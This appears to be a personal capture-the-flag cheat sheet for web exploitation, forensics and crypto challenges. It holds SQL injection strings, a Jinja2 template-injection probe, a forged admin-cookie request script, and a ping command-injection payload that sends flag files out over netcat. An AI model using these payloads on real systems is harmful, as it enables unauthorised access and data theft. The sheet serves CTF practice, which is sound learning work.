# Ch34tsh33t
My CheatSheet

Check /etc/shadow file permission
check /etc/passwd file permission
check cron jobs
Check sudo priv
Check SUID/SGID Executables

*Always check the Http method needed. Below are the list of HTTP Methods*
-POST
-GET
-PUT
-PATCH
-DELETE

*Using Google as secret-agent*
headers = {
	'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
}

*If No Login was provided but Admin login is available*
Try using cookie "admin" set it to "true"

*SQL Injection*
' OR '1'='1' --
' LIKE '%'; --
' UNION SELECT * FROM answers WHERE answer GLOB '<input>*'; --

*Testing for Flask framework (Jinja2)*
{{1+1}} -> {{config.items()}} OR {{config}}


*Exploiting Ping command via WebApp*
8.8.8.8; cat *flag* | nc -lp 54433 -> nc targetip 54433

*Python Code To get http request*

#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('{TARGET IP}', data=params, cookies=jar)
source = r.text
print re.findall(r'(flag\{.+\})', source)[0]

*OTHERS*

*Git-Dumper*

*Obfuscate*
http://www.jsnice.org/

*OSINT*
https://github.com/i3visio/writeup-osintctf-2018/blob/master/levels/level_03-Sweden.md
https://github.com/i3visio/writeup-osintctf-2018/blob/master/levels/level_05-Guatemala.md
https://github.com/i3visio/writeup-osintctf-2018/blob/master/levels/level_06-Zambia.md
https://www.digital.security/en/blog/write-defcon-25-recon-village-osint-ctf
https://medium.com/osintblog/recon-village-ctf-overview-fe8787f3ce7f
GOOGLE MX TOOLBOX *

*Misc*
https://medium.com/bugbountywriteup/meepwn-ctf-quals-2018-writeup-part-1-ab216bbf0b35
https://medium.com/bugbountywriteup/codefest19-ctf-writeups-a8f4e9b45d1

*Forensics*
strings filename | grep flag - HexDump
exiftool image | grep flag - Metadata
zsteg image - least significant bit - http://stylesuxx.github.io/steganography/
file filename
stegsolve 
https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/forensics/
https://pequalsnp-team.github.io/cheatsheet/steganography-101
https://0xrick.github.io/lists/stego/

*Crypto*
Vignere Cipher - https://www.dcode.fr/vigenere-cipher
ROT13 - https://rot13.com/
John The Ripper
Ceasar Cipher -https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,11)&input=eWpoaXB2ZGRzZGFzcnB0aHBncnhld3RnZHFuanl0dG8
Substitution Solver - https://www.guballa.de/substitution-solver
Ceasar Cipher (No Key) - https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx
Substitution - https://quipqiup.com/
CYBERCHEF

*Bitflip*
https://wannabyte.xyz/2018/10/picoctf-secure-logon/
https://security.stackexchange.com/questions/177614/how-difficult-is-it-to-modify-aes-ciphertext-in-a-meaningful-way

*General Skills*
https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/general-skills/
https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/general-skills/
